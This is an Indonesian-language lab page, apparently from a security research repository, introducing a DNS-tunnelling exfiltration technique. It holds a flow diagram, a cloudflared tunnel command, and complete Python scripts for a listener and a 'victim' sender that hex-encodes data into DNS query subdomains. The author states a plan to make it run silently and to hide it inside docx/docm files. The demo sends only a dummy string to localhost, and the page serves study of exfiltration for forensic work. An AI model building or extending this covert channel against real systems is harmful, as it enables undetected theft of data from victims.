# Dari mana idenya ?

###### Materi: penjelasan umum terkait lab reverse shell 
###### Media:  docx/docm + cloudflareTunneling
---
**penjelasan**
selain dari yang saya paparkan di [readme.md](README.md) di awal ide analisis ini mucul dari percobaan saya dalam melakukan 2 terminal saling berhungan dengan perantara tunneling clodflare

```
[ Laptop Kedua (Korban) ]
         │
         ▼ (Menjalankan dns-korban.py)
   [ Ambil Data Sistem ] ──► [ Ubah ke Hex ]
         │
         ▼ (Kirim Query DNS murni - Port 53)
         │  Perintah: nslookup [DATA_HEX].lab.local
         │
[ Jaringan / Router ] ──► (Meloloskan Port 53 karena dianggap traffic DNS biasa)
         │
         ▼ (Masuk lewat Tunnel Port 53)
[ Laptop Utama (Server Kamu) ]
         │
         ▼ (Diterima oleh dns-server.py pada Port 53)
   [ Baca Query ] ──► [ Potong `.lab.local` ] ──► [ Decode Hex ] ──► Teks Asli

```

dari skema di atas kemudian saya berencana untuk menyadikannya secara rapi agar bisa di eksekusi dengan silent. berikut kode awal yang saya gunakan dalam merepresentasiakn cara diatas:

**Tata cara**
+ hidupkan tunneling clodflare (saya pakai port 5000) - terminal jangan di tutup

```bash
.\cloudflared-windows-amd64.exe" tunnel --url http://localhost:5000
```
+ jalankan dns-server. py (pastikan berjalan di administrator) dengan code ada dibawah - terminal jangan ditutup
+ jalakan kemudian dns-korban. py - kode ada dibawah


**script code**
+ ***dns-server. py***

```python
import socket
import binascii

server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server.bind(('0.0.0.0', 5000))

print("[*] DNS Forensic Lab Server aktif di Port 5000...")

while True:
    data, addr = server.recvfrom(1024)
    
    try:
        # Konversi paket ke teks biasa dengan mengabaikan biner aneh di ujung-ujung
        raw_text = data.decode('utf-8', errors='ignore')
        
        if "labforensik" in raw_text:
            print(f"\n[ ALERT - DATA EXFILTRATION DETECTED]")
            print(f" -> Dari IP       : {addr[0]}:{addr[1]}")
            
            # Memisahkan teks berdasarkan domain untuk mengambil bagian depan (subdomain)
            parts = raw_text.split("labforensik")
            subdomain_raw = parts[0]
            
            # Membersihkan karakter biner dummy di depan string hex teks
            # Kita hanya mengambil karakter alfanumerik (0-9, a-f)
            clean_hex_text = "".join(c for c in subdomain_raw if c in "0123456789abcdefABCDEF")
            
            print(f" -> Subdomain (Hex Text): {clean_hex_text}")
            
            # Proses Decode Dua Tahap karena "Hex di dalam Teks ASCII"
            try:
                # Tahap 1: Mengubah Hex Text menjadi bytes teks asli (contoh: '616c6265...' -> b'albert_stive')
                # Karena clean_hex_text sudah berwujud string hex dari data asli, kita decode langsung
                decoded_data = binascii.unhexlify(clean_hex_text).decode('utf-8')
                print(f" -> Hasil Dekripsi Data : {decoded_data}")
            except Exception as decode_err:
                print(f" -> Gagal decode data: {decode_err}")
                
            print("-" * 50)
            
    except Exception as e:
        print(f"[-] Gagal memproses paket: {e}")
```

+ ***dns-korban. py***

```python
import socket
import binascii

def kirim_data_lewat_dns(data_sensitif):
    print(f"[*] Data asli: {data_sensitif}")
    hex_data = binascii.hexlify(data_sensitif.encode('utf-8')).decode('utf-8')
    domain_tujuan = f"{hex_data}.labforensik.local"
    print(f"[*] Mengirim DNS Query ke: {domain_tujuan}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Membuat struktur paket DNS dummy yang valid
        packet = b'\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
        for part in domain_tujuan.split('.'):
            packet += bytes([len(part)]) + part.encode('utf-8')
        packet += b'\x00\x00\x01\x00\x01'
        
        # Tembak langsung secara spesifik ke IP localhost 127.0.0.1 port 5000
        sock.sendto(packet, ('127.0.0.1', 5000))
        print("[+] Paket DNS Berhasil Dikirim.")
    except Exception as e:
        print(f"[-] Gagal: {e}")

kirim_data_lewat_dns("albert_stive")
```

dari semua hal ini lah timpul dipikiran saya bagaimana jika ini diselipkan di file yang berbahasis OOXML dan dari sini analisis saya berlajut


